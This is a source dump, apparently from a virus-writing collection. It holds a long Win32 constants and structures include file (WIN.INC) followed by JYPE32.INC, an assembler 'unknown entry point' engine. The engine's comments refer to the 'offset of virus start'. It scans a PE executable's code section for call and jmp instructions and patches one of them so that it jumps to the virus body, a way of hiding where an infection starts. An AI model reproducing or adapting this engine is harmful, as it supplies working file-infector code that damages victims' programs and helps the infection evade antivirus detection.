;FILE_GENERIC_WRITE   equ (STANDARD_RIGHTS_WRITE or FILE_WRITE_DATA or FILE_WRITE_ATTRIBUTES or FILE_WRITE_EA or FILE_APPEND_DATA or SYNCHRONIZE)
;FILE_GENERIC_EXECUTE equ (STANDARD_RIGHTS_EXECUTE or FILE_READ_ATTRIBUTES or FILE_EXECUTE or SYNCHRONIZE)

FILE_SHARE_READ                 equ 00000001h
FILE_SHARE_WRITE                equ 00000002h  
FILE_SHARE_DELETE               equ 00000004h  
FILE_ATTRIBUTE_READONLY         equ 00000001h  
FILE_ATTRIBUTE_HIDDEN           equ 00000002h  
FILE_ATTRIBUTE_SYSTEM           equ 00000004h  
FILE_ATTRIBUTE_DIRECTORY        equ 00000010h  
FILE_ATTRIBUTE_ARCHIVE          equ 00000020h  
FILE_ATTRIBUTE_NORMAL           equ 00000080h  
FILE_ATTRIBUTE_TEMPORARY        equ 00000100h  
FILE_ATTRIBUTE_COMPRESSED       equ 00000800h  
FILE_ATTRIBUTE_OFFLINE          equ 00001000h  
FILE_NOTIFY_CHANGE_FILE_NAME    equ 00000001h   
FILE_NOTIFY_CHANGE_DIR_NAME     equ 00000002h   
FILE_NOTIFY_CHANGE_ATTRIBUTES   equ 00000004h   
FILE_NOTIFY_CHANGE_SIZE         equ 00000008h   
FILE_NOTIFY_CHANGE_LAST_WRITE   equ 00000010h   
FILE_NOTIFY_CHANGE_LAST_ACCESS  equ 00000020h   
FILE_NOTIFY_CHANGE_CREATION     equ 00000040h   
FILE_NOTIFY_CHANGE_SECURITY     equ 00000100h   
FILE_ACTION_ADDED               equ 00000001h   
FILE_ACTION_REMOVED             equ 00000002h   
FILE_ACTION_MODIFIED            equ 00000003h   
FILE_ACTION_RENAMED_OLD_NAME    equ 00000004h   
FILE_ACTION_RENAMED_NEW_NAME    equ 00000005h   
FILE_CASE_SENSITIVE_SEARCH      equ 00000001h  
FILE_CASE_PRESERVED_NAMES       equ 00000002h  
FILE_UNICODE_ON_DISK            equ 00000004h  
FILE_PERSISTENT_ACLS            equ 00000008h  
FILE_FILE_COMPRESSION           equ 00000010h  
FILE_VOLUME_IS_COMPRESSED       equ 00008000h  
GENERIC_READ                    equ 80000000h
GENERIC_WRITE                   equ 40000000h
GENERIC_EXECUTE                 equ 20000000h
GENERIC_ALL                     equ 10000000h

DELETE                          equ  00010000h
READ_CONTROL                    equ  00020000h
WRITE_DAC                       equ  00040000h
WRITE_OWNER                     equ  00080000h
SYNCHRONIZE                     equ  00100000h
STANDARD_RIGHTS_RequIRED        equ  000F0000h
STANDARD_RIGHTS_READ            equ  READ_CONTROL
STANDARD_RIGHTS_WRITE           equ  READ_CONTROL
STANDARD_RIGHTS_EXECUTE         equ  READ_CONTROL
STANDARD_RIGHTS_ALL             equ  001F0000h
SPECIFIC_RIGHTS_ALL             equ  0000FFFFh

FILE_BEGIN           equ 0
FILE_CURRENT         equ 1
FILE_END             equ 2

ES_LEFT             equ 0000h
ES_CENTER           equ 0001h
ES_RIGHT            equ 0002h
ES_MULTILINE        equ 0004h
ES_UPPERCASE        equ 0008h
ES_LOWERCASE        equ 0010h
ES_PASSWORD         equ 0020h
ES_AUTOVSCROLL      equ 0040h
ES_AUTOHSCROLL      equ 0080h
ES_NOHIDESEL        equ 0100h
ES_OEMCONVERT       equ 0400h
ES_READONLY         equ 0800h
ES_WANTRETURN       equ 1000h
EN_SETFOCUS         equ 0100h
EN_KILLFOCUS        equ 0200h
EN_CHANGE           equ 0300h
EN_UPDATE           equ 0400h
EN_ERRSPACE         equ 0500h
EN_MAXTEXT          equ 0501h
EN_HSCROLL          equ 0601h
EN_VSCROLL          equ 0602h
EC_LEFTMARGIN       equ 0001h
EC_RIGHTMARGIN      equ 0002h
EC_USEFONTINFO      equ 0ffffh
EM_GETSEL               equ 00B0h
EM_SETSEL               equ 00B1h
EM_GETRECT              equ 00B2h
EM_SETRECT              equ 00B3h
EM_SETRECTNP            equ 00B4h
EM_SCROLL               equ 00B5h
EM_LINESCROLL           equ 00B6h
EM_SCROLLCARET          equ 00B7h
EM_GETMODIFY            equ 00B8h
EM_SETMODIFY            equ 00B9h
EM_GETLINECOUNT         equ 00BAh
EM_LINEINDEX            equ 00BBh
EM_SETHANDLE            equ 00BCh
EM_GETHANDLE            equ 00BDh
EM_GETTHUMB             equ 00BEh
EM_LINELENGTH           equ 00C1h
EM_REPLACESEL           equ 00C2h
EM_GETLINE              equ 00C4h
EM_LIMITTEXT            equ 00C5h
EM_CANUNDO              equ 00C6h
EM_UNDO                 equ 00C7h
EM_FMTLINES             equ 00C8h
EM_LINEFROMCHAR         equ 00C9h
EM_SETTABSTOPS          equ 00CBh
EM_SETPASSWORDCHAR      equ 00CCh
EM_EMPTYUNDOBUFFER      equ 00CDh
EM_GETFIRSTVISIBLELINE  equ 00CEh
EM_SETREADONLY          equ 00CFh
EM_SETWORDBREAKPROC     equ 00D0h
EM_GETWORDBREAKPROC     equ 00D1h
EM_GETPASSWORDCHAR      equ 00D2h
EM_SETMARGINS           equ 00D3h
EM_GETMARGINS           equ 00D4
EM_SETLIMITTEXT         equ EM_LIMITTEXT
EM_GETLIMITTEXT         equ 00D5h
EM_POSFROMCHAR          equ 00D6h
EM_CHARFROMPOS          equ 00D7h
WB_LEFT           equ  0        
WB_RIGHT          equ  1        
WB_ISDELIMITER    equ  2        
BS_PUSHBUTTON     equ   00000000h
BS_DEFPUSHBUTTON  equ   00000001h
BS_CHECKBOX       equ   00000002h
BS_AUTOCHECKBOX   equ   00000003h
BS_RADIOBUTTON    equ   00000004h
BS_3STATE         equ   00000005h
BS_AUTO3STATE     equ   00000006h
BS_GROUPBOX       equ   00000007h
BS_USERBUTTON     equ   00000008h
BS_AUTORADIOBUTTON equ   00000009h
BS_OWNERDRAW      equ   0000000Bh
BS_LEFTTEXT       equ   00000020h
BS_TEXT           equ   00000000h
BS_ICON           equ   00000040h
BS_BITMAP         equ   00000080h
BS_LEFT           equ   00000100h
BS_RIGHT          equ   00000200h
BS_CENTER         equ   00000300h
BS_TOP            equ   00000400h
BS_BOTTOM         equ   00000800h
BS_VCENTER        equ   00000C00h
BS_PUSHLIKE       equ   00001000h
BS_MULTILINE      equ   00002000h
BS_NOTIFY         equ   00004000h
BS_FLAT           equ   00008000h
BS_RIGHTBUTTON    equ   BS_LEFTTEXT
BN_CLICKED        equ   0       
BN_PAINT          equ   1       
BN_HILITE         equ   2       
BN_UNHILITE       equ   3       
BN_DISABLE        equ   4       
BN_DOUBLECLICKED  equ   5       
BN_PUSHED         equ   BN_HILITE
BN_UNPUSHED       equ   BN_UNHILITE
BN_DBLCLK         equ   BN_DOUBLECLICKED
BN_SETFOCUS       equ   6
BN_KILLFOCUS      equ   7
BM_GETCHECK       equ  00F0h
BM_SETCHECK       equ  00F1h
BM_GETSTATE       equ  00F2h
BM_SETSTATE       equ  00F3h
BM_SETSTYLE       equ  00F4h
BM_CLICK          equ  00F5h
BM_GETIMAGE       equ  00F6h
BM_SETIMAGE       equ  00F7h
BST_UNCHECKED     equ  0000h
BST_CHECKED       equ  0001h
BST_INDETERMINATE equ  0002h
BST_PUSHED        equ  0004h
BST_FOCUS         equ  0008h
SS_LEFT           equ   00000000h
SS_CENTER         equ   00000001h
SS_RIGHT          equ   00000002h
SS_ICON           equ   00000003h
SS_BLACKRECT      equ   00000004h
SS_GRAYRECT       equ   00000005h
SS_WHITERECT      equ   00000006h
SS_BLACKFRAME     equ   00000007h
SS_GRAYFRAME      equ   00000008h
SS_WHITEFRAME     equ   00000009h
SS_USERITEM       equ   0000000Ah
SS_SIMPLE         equ   0000000Bh
SS_LEFTNOWORDWRAP equ   0000000Ch
SS_OWNERDRAW      equ   0000000Dh
SS_BITMAP         equ   0000000Eh
SS_ENHMETAFILE    equ   0000000Fh
SS_ETCHEDHORZ     equ   00000010h
SS_ETCHEDVERT     equ   00000011h
SS_ETCHEDFRAME    equ   00000012h
SS_TYPEMASK       equ   0000001Fh
SS_NOTIFY         equ   00000100h
SS_CENTERIMAGE    equ   00000200h
SS_RIGHTJUST      equ   00000400h
SS_REALSIZEIMAGE  equ   00000800h
SS_SUNKEN         equ   00001000h
SS_ENDELLIPSIS    equ   00004000h
SS_PATHELLIPSIS   equ   00008000h
SS_WORDELLIPSIS   equ   0000C000h
SS_ELLIPSISMASK   equ   0000C000h

CDN_FIRST   equ (0-601)
CDN_LAST    equ (0-699)
OFN_READONLY                 equ 00000001h
OFN_OVERWRITEPROMPT          equ 00000002h
OFN_HIDEREADONLY             equ 00000004h
OFN_NOCHANGEDIR              equ 00000008h
OFN_SHOWHELP                 equ 00000010h
OFN_ENABLEHOOK               equ 00000020h
OFN_ENABLETEMPLATE           equ 00000040h
OFN_ENABLETEMPLATEHANDLE     equ 00000080h
OFN_NOVALIDATE               equ 00000100h
OFN_ALLOWMULTISELECT         equ 00000200h
OFN_EXTENSIONDIFFERENT       equ 00000400h
OFN_PATHMUSTEXIST            equ 00000800h
OFN_FILEMUSTEXIST            equ 00001000h
OFN_CREATEPROMPT             equ 00002000h
OFN_SHAREAWARE               equ 00004000h
OFN_NOREADONLYRETURN         equ 00008000h
OFN_NOTESTFILECREATE         equ 00010000h
OFN_NONETWORKBUTTON          equ 00020000h
OFN_NOLONGNAMES              equ 00040000h   
OFN_EXPLORER                 equ 00080000h   
OFN_NODEREFERENCELINKS       equ 00100000h
OFN_LONGNAMES                equ 00200000h   
OFN_SHAREFALLTHROUGH    equ  2   
OFN_SHARENOWARN         equ  1
OFN_SHAREWARN           equ  0
CDN_INITDONE            equ (CDN_FIRST - 0000)
CDN_SELCHANGE           equ (CDN_FIRST - 0001)
CDN_FOLDERCHANGE        equ (CDN_FIRST - 0002)
CDN_SHAREVIOLATION      equ (CDN_FIRST - 0003)
CDN_HELP                equ (CDN_FIRST - 0004)
CDN_FILEOK              equ (CDN_FIRST - 0005)
CDN_TYPECHANGE          equ (CDN_FIRST - 0006)

DEBUG_PROCESS               equ 00000001h
DEBUG_ONLY_THIS_PROCESS     equ 00000002h
CREATE_SUSPENDED            equ 00000004h
DETACHED_PROCESS            equ 00000008h
CREATE_NEW_CONSOLE          equ 00000010h
NORMAL_PRIORITY_CLASS       equ 00000020h
IDLE_PRIORITY_CLASS         equ 00000040h
HIGH_PRIORITY_CLASS         equ 00000080h
REALTIME_PRIORITY_CLASS     equ 00000100h
CREATE_NEW_PROCESS_GROUP    equ 00000200h
CREATE_UNICODE_ENVIRONMENT  equ 00000400h
CREATE_SEPARATE_WOW_VDM     equ 00000800h
CREATE_SHARED_WOW_VDM       equ 00001000h
CREATE_FORCEDOS             equ 00002000h
CREATE_DEFAULT_ERROR_MODE   equ 04000000h
CREATE_NO_WINDOW            equ 08000000h
PROFILE_USER                equ 10000000h
PROFILE_KERNEL              equ 20000000h
PROFILE_SERVER              equ 40000000h

MAXLONGLONG equ (7fffffffffffffffh)
MAXLONG     equ 7fffffffh
MAXBYTE     equ 0ffh
MAXWORD     equ 0ffffh
MAXDWORD    equ 0ffffffffh
MINCHAR     equ 80h
MAXCHAR     equ 07fh
MINSHORT    equ 8000h
MAXSHORT    equ 7fffh
MINLONG     equ 80000000h

THREAD_BASE_PRIORITY_LOWRT  equ 15  ;// value that gets a thread to LowRealtime-1
THREAD_BASE_PRIORITY_MAX    equ 2   ;// maximum thread base priority boost
THREAD_BASE_PRIORITY_MIN    equ -2  ;// minimum thread base priority boost
THREAD_BASE_PRIORITY_IDLE   equ -15 ;// value that gets a thread to idle
THREAD_PRIORITY_LOWEST          equ THREAD_BASE_PRIORITY_MIN
THREAD_PRIORITY_BELOW_NORMAL    equ (THREAD_PRIORITY_LOWEST+1)
THREAD_PRIORITY_NORMAL          equ 0
THREAD_PRIORITY_HIGHEST         equ THREAD_BASE_PRIORITY_MAX
THREAD_PRIORITY_ABOVE_NORMAL    equ (THREAD_PRIORITY_HIGHEST-1)
THREAD_PRIORITY_ERROR_RETURN    equ (MAXLONG)
THREAD_PRIORITY_TIME_CRITICAL   equ THREAD_BASE_PRIORITY_LOWRT
THREAD_PRIORITY_IDLE            equ THREAD_BASE_PRIORITY_IDLE

HKEY_CLASSES_ROOT      equ      80000000h
HKEY_CURRENT_USER      equ      80000001h
HKEY_LOCAL_MACHINE     equ      80000002h
HKEY_USERS             equ      80000003h
HKEY_PERFORMANCE_DATA  equ      80000004h
HKEY_CURRENT_CONFIG    equ      80000005h
HKEY_DYN_DATA          equ      80000006h
 
REG_OPTION_RESERVED     equ 00000000h
REG_OPTION_NON_VOLATILE equ 00000000h
REG_OPTION_VOLATILE     equ 00000001h
REG_OPTION_CREATE_LINK  equ 00000002h
REG_OPTION_BACKUP_RESTORE equ 00000004h
REG_OPTION_OPEN_LINK    equ 00000008h
REG_LEGAL_OPTION        equ REG_OPTION_RESERVED or REG_OPTION_NON_VOLATILE or REG_OPTION_VOLATILE or REG_OPTION_CREATE_LINK or REG_OPTION_BACKUP_RESTORE or REG_OPTION_OPEN_LINK
REG_CREATED_NEW_KEY     equ 00000001h
REG_OPENED_EXISTING_KEY equ 00000002h
REG_WHOLE_HIVE_VOLATILE equ 00000001h
REG_REFRESH_HIVE        equ 00000002h
REG_NO_LAZY_FLUSH       equ 00000004h
REG_NOTIFY_CHANGE_NAME       equ     00000001h
REG_NOTIFY_CHANGE_ATTRIBUTES equ     00000002h
REG_NOTIFY_CHANGE_LAST_SET   equ     00000004h
REG_NOTIFY_CHANGE_SECURITY   equ     00000008h
REG_LEGAL_CHANGE_FILTER      equ     REG_NOTIFY_CHANGE_NAME or REG_NOTIFY_CHANGE_ATTRIBUTES or REG_NOTIFY_CHANGE_LAST_SET or REG_NOTIFY_CHANGE_SECURITY
REG_NONE            equ     0
REG_SZ              equ     1
REG_EXPAND_SZ       equ     2
REG_BINARY          equ     3
REG_DWORD           equ     4
REG_DWORD_LITTLE_ENDIAN     equ 4 
REG_DWORD_BIG_ENDIAN        equ 5 
REG_LINK            equ     6
REG_MULTI_SZ        equ     7
REG_RESOURCE_LIST   equ     8
REG_FULL_RESOURCE_DESCRIPTOR   equ 9 
REG_RESOURCE_RequIREMENTS_LIST equ 10

KEY_QUERY_VALUE     equ     0001h
KEY_SET_VALUE       equ     0002h
KEY_CREATE_SUB_KEY  equ     0004h
KEY_ENUMERATE_SUB_KEYS equ  0008h
KEY_NOTIFY          equ     0010h
KEY_CREATE_LINK     equ     0020h

KEY_READ            equ     (STANDARD_RIGHTS_READ or KEY_QUERY_VALUE or KEY_ENUMERATE_SUB_KEYS or KEY_NOTIFY) and (not SYNCHRONIZE)
KEY_WRITE           equ     (STANDARD_RIGHTS_WRITE or KEY_SET_VALUE or KEY_CREATE_SUB_KEY) and (not SYNCHRONIZE)
KEY_EXECUTE         equ     (KEY_READ) and (not SYNCHRONIZE)
KEY_ALL_ACCESS      equ     (STANDARD_RIGHTS_ALL or KEY_QUERY_VALUE or KEY_SET_VALUE or KEY_CREATE_SUB_KEY or KEY_ENUMERATE_SUB_KEYS or KEY_NOTIFY or KEY_CREATE_LINK) and (not SYNCHRONIZE)
SERVICE_KERNEL_DRIVER                   equ     000000001h
SERVICE_FILE_SYSTEM_DRIVER              equ     000000002h
SERVICE_ADAPTER     equ     000000004h
SERVICE_RECOGNIZER_DRIVER               equ     000000008h
SERVICE_DRIVER      equ     SERVICE_KERNEL_DRIVER or SERVICE_FILE_SYSTEM_DRIVER or SERVICE_RECOGNIZER_DRIVER
SERVICE_WIN32_OWN_PROCESS               equ     000000010h
SERVICE_WIN32_SHARE_PROCESS             equ     000000020h
SERVICE_WIN32       equ     SERVICE_WIN32_OWN_PROCESS or SERVICE_WIN32_SHARE_PROCESS
SERVICE_INTERACTIVE_PROCESS             equ     000000100h
SERVICE_TYPE_ALL    equ     SERVICE_WIN32 or SERVICE_ADAPTER or SERVICE_DRIVER or SERVICE_INTERACTIVE_PROCESS
SERVICE_BOOT_START  equ     0
SERVICE_SYSTEM_START          equ     000000001h
SERVICE_AUTO_START  equ     000000002h
SERVICE_DEMAND_START          equ     000000003h
SERVICE_DISABLED    equ     000000004h
SERVICE_ERROR_IGNORE          equ     0
SERVICE_ERROR_NORMAL          equ     000000001h
SERVICE_ERROR_SEVERE          equ     000000002h
SERVICE_ERROR_CRITICAL        equ     000000003h

; ====================================================================
@wordalign macro Adr,x
        if (($-Adr)/2) NE (($-Adr+1)/2) 
            db x
        endif
        endm
@dwordalign macro Adr,x
        if 4-(($-Adr) mod 4)
            db 4-(($-Adr) mod 4) dup (x)
        endif
        endm

f_struc                struc                         ; win32 "searchrec"
                                                     ; structure
ff_attr                 dd      ?
ff_time_create          dd      ?,?
ff_time_lastaccess      dd      ?,?
ff_time_lastwrite       dd      ?,?
ff_size_hi              dd      ?
ff_size                 dd      ?
                        dd      ?,?
ff_fullname             db      260 dup (?) 
                        

ff_shortname            db      14 dup (?)

                        ends

;GDI strucs

WNDCLASSEX	struc
	cbSize		dd	?
	style		dd	?
	lpfnWndProc	dd	?
	cbClsExtra	dd	?
	cbWndExtra	dd	?
	hInstance	dd	?
	hIcon		dd	?
	hCursor		dd	?
	hbrBackground	dd	?
	lpszMenuName	dd	?
	lpszClassName	dd	?
	hIconSm		dd	?
WNDCLASSEX	ends

MSG	struc
	hwnd	dd	?
	message	dd	?
	wParam	dd	?
	lParam	dd	?
	time	dd	?
	pt	dd	?
MSG	ends

RECT    struc
        left    dd      ?
        top     dd      ?
        right   dd      ?
        bottom  dd      ?
RECT    ends

PAINTSTRUCT struc 
         hdc         dd      ? 
         fErase      dd      ?
         rcPaint     RECT<,,,>
         fRestore    dd      ?
         fIncUpdate  dd    ? 
         rgbReserved db 32 dup(?) 
PAINTSTRUCT ends
 





CW_USEDEFAULT		equ	80000000h
SW_SHOWNORMAL		equ	1
COLOR_WINDOW		equ	5
IDI_APPLICATION		equ	32512
WS_OVERLAPPEDWINDOW 	equ	0CF0000h

DT_TOP                  equ    0
DT_LEFT                 equ    0
DT_CENTER               equ    1
DT_RIGHT                equ    2
DT_VCENTER              equ    4
DT_BOTTOM               equ    8
DT_WORDBREAK            equ    10h
DT_SINGLELINE           equ    20h
DT_EXPANDTABS           equ    40h
DT_TABSTOP              equ    80h
DT_NOCLIP               equ    100h
DT_EXTERNALLEADING      equ    200h
DT_CALCRECT             equ    400h
DT_NOPREFIX             equ    800h
DT_INTERNAL             equ    1000h


Pushad_Struc	STRUC
_edi		DD	?
_esi		DD	?
_ebp		DD	?
_esp		DD	?
_ebx		DD	?
_edx		DD	?
_ecx		DD	?
_eax		DD	?
Pushad_Struc	ENDS
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[WIN.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[JYPE32.INC]컴�
;=============================================================================
;LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME LAME  
;=============================================================================
;JYPE32
;    Just Unknown Entry Point Engine 32bits
;
;Input as pascal calling convercion(all values a DWORDs):
;
;CreateUEP(d,c,b,a)
;
;a-Virtual offset of begin of code section(in PE)
;b-Offset of virus start(virtual)
;c-Size for scan
;d-Offset of section dump


CreateUEP  proc
        pushad

        mov esi,[esp+9*4]              ;section dump
        mov ecx,[esp+10*4]             ;size of section dump

        xor edi,edi
        xor ebx,ebx
_find_command:

        lodsb
        inc edi                        ;incriminate counter

        cmp al,0e9h                    ;jmp  xxxx
        je _replace

        cmp al,0e8h                    ;call xxxx
        je _replace

_find_command_next:

        cmp edi,ecx
        jna _find_command

Uep_error:
				       ;no finded:(
        mov 4 ptr [esp+7*4],-1         ;eax=-1 
        popad
        ret 16

_replace:
;----------------------------------------------------------
        xor eax,eax                             ;Data part?

        cmp edi,9
        jb  _foward 

        cmp [esi-9],0
        jne _foward

        cmp [esi-5],0
        jne _foward
        inc eax
_foward:
        cmp [esi],0
        jne _result 

        cmp [esi+4],0
        jne _result 
        inc eax
_result:
        cmp eax,2  
        je _find_command_next

;----------------------------------------------------------
        mov cl,8
        mov eax,[esi-5]                  ;eax=dword before jump/call or ?

_mov_eax_m:
        cmp eax,0
        je _mov_ok

        cmp al,00010100b                 ;adc al,i8
        je _find_command_next

        cmp al,00010101b                 ;adc ax,i16
        je _find_command_next

        cmp al,10000011b                 ;adc r16/i32,18
        je _find_command_next

        cmp al,00000100b                 ;add al,i8
        je _find_command_next

        cmp al,00000101b                 ;add ax,i16
        je _find_command_next

        cmp al,00011100b                 ;sbb al,i8
        je _find_command_next

        cmp al,00011101b                 ;sbb ax,i16
        je _find_command_next

        cmp al,00100100b                 ;and al,i8
        je _find_command_next

        cmp al,00100101b                 ;and ax,i16/and eax,i32
        je _find_command_next

        cmp al,00001100b                 ;or al,i8
        je _find_command_next

        cmp al,00001101b                 ;or ax,i16/or eax,i32 
        je _find_command_next

;---------------------------------------

        and al,11111110b

        cmp al,11000110b                 ;mov m8/m16/m32,eax/ax/al
        je _find_command_next

        cmp al,10001010b                 ;mov r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,10001000b                 ;mov m8/16/m32,r8/r16/r32
        je _find_command_next

        cmp al,00010010b                 ;adc r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,00010000b                 ;adc m8/16/m32,r8/r16/r32
        je _find_command_next

        cmp al,00000010b                 ;add r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,00000000b                 ;add m8/16/m32,r8/r16/r32
        je _find_command_next

        cmp al,00011010b                 ;sbb r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,00011000b                 ;sbb m8/16/m32,r8/r16/r32
        je _find_command_next

        cmp al,11110110b                 ;not m8/m16/m32
        je _find_command_next

        cmp al,00001010b                 ;or  r8/r16/r32,m8/16/m32
        je _find_command_next

        cmp al,00001000b                 ;or  m8/16/m32,r8/r16/r32
        je _find_command_next
;---------------------------------------

        and al,11111100b          

        cmp al,10100000b                 ;adc al/ax/eax,r8/r16/r32
        je _find_command_next

        cmp al,10000000b                 ;adc al/ax/eax,i8/i16/i32
        je _find_command_next            ;& others ;)

        shr eax,cl

        jmp _mov_eax_m

;----------------------------------------------------------
_mov_ok:

        test ebx,ebx                   ;First command? 
        jnz _mov_next

        inc ebx
        jmp _find_command

_mov_next:
        dec edi                        ;edi=va(from rva) where is jmp

        mov eax,[esp+11*4]             ;offset of virus start
        mov ebx,[esp+12*4]             ;RVA of section

        lea ecx,[ebx+edi+5]            ;jump address (VA of virus)-(RVA+edi+5)
        lea edx,[ebx+edi]              ;edx=old adress to modify
        sub eax,ecx                    

        mov ebx,[esi]                  ;ebx=old address to jump
        mov [esi],eax                  ;modify

        movzx eax,byte ptr[esi-1]      ;eax= command
        mov byte ptr[esi-1],0E9h       ;replace on jmp

        mov [esp+7*4],eax              ;eax<-:edx=command:adress
        mov [esp+5*4],ebx              ;eax:edx<-=command:adress

        mov [esp],edx                  ;edi=real va adress

        popad
        ret 16
CreateUEP endp
;=============================================================================
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[JYPE32.INC]컴�
